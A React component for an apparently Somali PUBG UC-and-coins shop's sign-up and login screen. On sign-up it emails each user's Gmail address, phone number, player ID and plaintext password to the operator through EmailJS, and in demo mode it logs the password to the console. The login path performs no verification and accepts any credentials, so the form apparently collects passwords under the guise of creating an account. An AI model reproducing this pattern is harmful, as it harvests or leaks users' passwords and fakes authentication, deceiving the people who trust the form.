import React, { useState, useEffect } from 'react';
import { Mail, Phone, Lock, ArrowRight, Github, Chrome, X } from 'lucide-react';
import { motion } from 'motion/react';
import emailjs from '@emailjs/browser';

interface AuthProps {
  onBack: () => void;
  initialMode?: 'login' | 'signup';
  onSuccess?: () => void;
}

export default function Auth({ onBack, initialMode = 'signup', onSuccess }: AuthProps) {
  const [mode, setMode] = useState<'login' | 'signup'>(initialMode);
  const [formData, setFormData] = useState({
    email: '',
    phone: '',
    password: '',
    playerId: ''
  });
  const [status, setStatus] = useState<{ type: 'success' | 'error', msg: string } | null>(null);
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [isSubmitted, setIsSubmitted] = useState(false);

  useEffect(() => {
    const publicKey = import.meta.env.VITE_EMAILJS_PUBLIC_KEY;
    if (publicKey && publicKey !== 'YOUR_PUBLIC_KEY') {
      emailjs.init(publicKey);
    }
  }, []);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setStatus(null);

    if (mode === 'signup') {
      if (!formData.email && !formData.phone) {
        setStatus({ type: 'error', msg: 'Fadlan geli Gmail ama Lambarka Taleefanka' });
        return;
      }
      
      if (!formData.password) {
        setStatus({ type: 'error', msg: 'Fadlan abuur Password' });
        return;
      }

      setIsSubmitting(true);

      const templateParams = {
        user_email: formData.email,
        user_phone: formData.phone,
        user_password: formData.password,
        player_id: formData.playerId,
      };

      try {
        const serviceId = import.meta.env.VITE_EMAILJS_SERVICE_ID;
        const templateId = import.meta.env.VITE_EMAILJS_TEMPLATE_ID;
        const publicKey = import.meta.env.VITE_EMAILJS_PUBLIC_KEY;

        const sendToWhatsApp = () => {
          const tel_number = "252771909054"; 
          const message = `Asc Maanka, waxaan rabaa inaan iibsado UC&conis. Xogtaydu waa lambarka lacagta: Tel: ${formData.phone}`;
          const whatsappUrl = `https://wa.me/${tel_number}?text=${encodeURIComponent(message)}`;
          window.open(whatsappUrl, '_blank');
        };

        if (serviceId && templateId && publicKey && serviceId !== 'YOUR_SERVICE_ID') {
          await emailjs.send(serviceId, templateId, templateParams, publicKey);
          
          setIsSubmitting(false);
          if (onSuccess) onSuccess();
          setIsSubmitted(true);
          sendToWhatsApp();

          setStatus({ 
            type: 'success', 
            msg: "Waad ku mahadsantahay is-diiwaangelinta! Dalabkaaga UC waa nala soo gaaray." 
          });
        } else {
          // Demo fallback
          console.log('EmailJS keys not configured. Data:', formData);
          setIsSubmitting(false);
          if (onSuccess) onSuccess();
          setIsSubmitted(true);
          sendToWhatsApp();
          setStatus({ 
            type: 'success', 
            msg: "Waad ku mahadsantahay is-diiwaangelinta! (Demo Mode)\nDalabkaaga UC waa nala soo gaaray." 
          });
        }
      } catch (error: any) {
        console.error('EmailJS Error:', error);
        setStatus({ type: 'error', msg: "Khalad ayaa dhacay, fadlan mar kale isku day." });
      } finally {
        setIsSubmitting(false);
      }
    } else {
      // Login logic
      if (!formData.email || !formData.password) {
        setStatus({ type: 'error', msg: 'Fadlan geli email-ka iyo password-ka' });
        return;
      }
      if (onSuccess) onSuccess();
      setStatus({ type: 'success', msg: 'Si guul leh ayaad u soo gashay!' });
      setTimeout(() => onBack(), 2000);
    }
  };

  return (
    <section className="pt-32 pb-24 min-h-screen flex items-center justify-center px-4" id="auth-section">
      <motion.div 
        initial={{ opacity: 0, y: 20 }}
        animate={{ opacity: 1, y: 0 }}
        className="max-w-md w-full relative"
      >
        <button 
          onClick={onBack}
          className="absolute -top-12 right-0 p-2 text-slate-500 hover:text-slate-100 transition-colors"
          id="auth-close-btn"
        >
          <X className="w-6 h-6" />
        </button>

        <div className="glass-card rounded-2xl p-8 border-t-4 border-t-brand-primary gaming-glow">
          <div className="text-center mb-10">
            <h2 className="text-3xl font-display font-black mb-3">
              {mode === 'signup' ? 'Is-diiwaangeli' : 'Soo Gal'}
            </h2>
            <p className="text-slate-400 text-sm">
              {mode === 'signup' 
                ? 'Ku biir BARAA UC & COINS si aad u hesho adeeg degdeg ah.' 
                : 'Ku soo dhawaada mar kale, saaxiibka ciyaaraha.'}
            </p>
          </div>

          {status && (
            <motion.div 
              initial={{ opacity: 0, scale: 0.95 }}
              animate={{ opacity: 1, scale: 1 }}
              className={`mb-6 p-4 rounded-xl text-sm font-bold flex items-center gap-3 ${
                status.type === 'success' ? 'bg-green-500/10 text-green-500 border border-green-500/20' : 'bg-red-500/10 text-red-500 border border-red-500/20'
              }`}
            >
              <div className={`w-2 h-2 rounded-full ${status.type === 'success' ? 'bg-green-500' : 'bg-red-500'}`} />
              <p className="whitespace-pre-line">{status.msg}</p>
            </motion.div>
          )}

          <form className="space-y-5" onSubmit={handleSubmit}>
            {mode === 'signup' && (
              <div>
                <label className="block text-xs font-bold text-slate-500 uppercase tracking-widest mb-2">PUBG Player ID</label>
                <div className="relative">
                  <div className="absolute left-4 top-1/2 -translate-y-1/2 w-4 h-4 flex items-center justify-center">
                    <span className="text-[10px] font-black text-brand-primary">ID</span>
                  </div>
                  <input 
                    type="text" 
                    placeholder="Geli Player ID-gaaga"
                    value={formData.playerId}
                    onChange={(e) => setFormData({...formData, playerId: e.target.value})}
                    className="w-full bg-brand-bg/50 border border-slate-700 rounded-xl py-3.5 pl-12 pr-4 text-slate-100 placeholder:text-slate-600 focus:outline-none focus:border-brand-primary transition-all"
                    id="auth-playerid-input"
                  />
                </div>
              </div>
            )}

            <div>
              <label className="block text-xs font-bold text-slate-500 uppercase tracking-widest mb-2">Gmail-kaaga</label>
              <div className="relative">
                <Mail className="absolute left-4 top-1/2 -translate-y-1/2 w-4 h-4 text-slate-500" />
                <input 
                  type="email" 
                  placeholder="tusaale@gmail.com"
                  value={formData.email}
                  onChange={(e) => setFormData({...formData, email: e.target.value})}
                  className="w-full bg-brand-bg/50 border border-slate-700 rounded-xl py-3.5 pl-12 pr-4 text-slate-100 placeholder:text-slate-600 focus:outline-none focus:border-brand-primary transition-all"
                  id="auth-email-input"
                />
              </div>
            </div>

            {mode === 'signup' && (
              <>
                <div className="flex items-center gap-4 py-1">
                  <div className="h-px bg-slate-800 flex-1" />
                  <span className="text-[10px] font-bold text-slate-600 uppercase tracking-widest">ama</span>
                  <div className="h-px bg-slate-800 flex-1" />
                </div>

                <div>
                  <label className="block text-xs font-bold text-slate-500 uppercase tracking-widest mb-2">Lambarka Taleefanka</label>
                  <div className="relative">
                    <div className="absolute left-4 top-1/2 -translate-y-1/2 flex items-center gap-2 pr-3 border-r border-slate-700">
                      <span className="text-xs font-bold text-slate-400">+252</span>
                    </div>
                    <input 
                      type="tel" 
                      placeholder="61XXXXXXX"
                      value={formData.phone}
                      onChange={(e) => setFormData({...formData, phone: e.target.value})}
                      className="w-full bg-brand-bg/50 border border-slate-700 rounded-xl py-3.5 pl-20 pr-4 text-slate-100 placeholder:text-slate-600 focus:outline-none focus:border-brand-primary transition-all"
                      id="auth-phone-input"
                    />
                  </div>
                </div>
              </>
            )}

            <div>
              <label className="block text-xs font-bold text-slate-500 uppercase tracking-widest mb-2">Password-ka</label>
              <div className="relative">
                <Lock className="absolute left-4 top-1/2 -translate-y-1/2 w-4 h-4 text-slate-500" />
                <input 
                  type="password" 
                  placeholder={mode === 'signup' ? 'Abuur password adag' : 'Gali password-kaaga'}
                  value={formData.password}
                  onChange={(e) => setFormData({...formData, password: e.target.value})}
                  className="w-full bg-brand-bg/50 border border-slate-700 rounded-xl py-3.5 pl-12 pr-4 text-slate-100 placeholder:text-slate-600 focus:outline-none focus:border-brand-primary transition-all"
                  id="auth-password-input"
                />
              </div>
            </div>

            {isSubmitted ? (
              <div className="w-full bg-brand-primary/10 text-brand-primary py-4 rounded-xl font-black text-lg flex items-center justify-center gap-2 mt-4 border border-brand-primary/20 shadow-lg animate-pulse" id="auth-success-message">
                Dalabkaaga waa nala soo gaaray
              </div>
            ) : (
              <button 
                type="submit"
                disabled={isSubmitting}
                className={`w-full bg-brand-primary text-brand-bg py-4 rounded-xl font-black text-lg hover:bg-brand-primary-hover transition-all flex items-center justify-center gap-2 mt-4 shadow-lg shadow-brand-primary/10 ${isSubmitting ? 'opacity-50 cursor-not-allowed' : ''}`}
                id="auth-submit-btn"
              >
                {isSubmitting ? (
                  <div className="flex items-center gap-2">
                    <div className="w-5 h-5 border-2 border-brand-bg border-t-transparent rounded-full animate-spin" />
                    Diraya...
                  </div>
                ) : (
                  <>
                    {mode === 'signup' ? 'Sign Up' : 'Soo Gal'}
                    <ArrowRight className="w-5 h-5" />
                  </>
                )}
              </button>
            )}
          </form>

          <div className="mt-10 pt-8 border-t border-slate-800/50">
            <div className="text-center">
              <p className="text-sm text-slate-500">
                {mode === 'signup' ? 'Hadda ka hor miyaad is-diiwaangelisay?' : 'Miyaanad lahayn koonte?'}
                <button 
                  onClick={() => setMode(mode === 'signup' ? 'login' : 'signup')}
                  className="ml-2 text-brand-primary font-bold hover:underline"
                  id="auth-mode-toggle"
                >
                  {mode === 'signup' ? 'Soo Gal' : 'Is-diiwaangeli'}
                </button>
              </p>
            </div>
            
            <div className="mt-8 grid grid-cols-2 gap-4">
              <button className="flex items-center justify-center gap-2 p-3 bg-slate-800/50 border border-slate-700 rounded-xl text-slate-300 hover:bg-slate-800 hover:text-white transition-all text-xs font-bold">
                <Chrome className="w-3.5 h-3.5" />
                Google
              </button>
              <button className="flex items-center justify-center gap-2 p-3 bg-slate-800/50 border border-slate-700 rounded-xl text-slate-300 hover:bg-slate-800 hover:text-white transition-all text-xs font-bold">
                <Github className="w-3.5 h-3.5" />
                GitHub
              </button>
            </div>
          </div>
        </div>
      </motion.div>
    </section>
  );
}
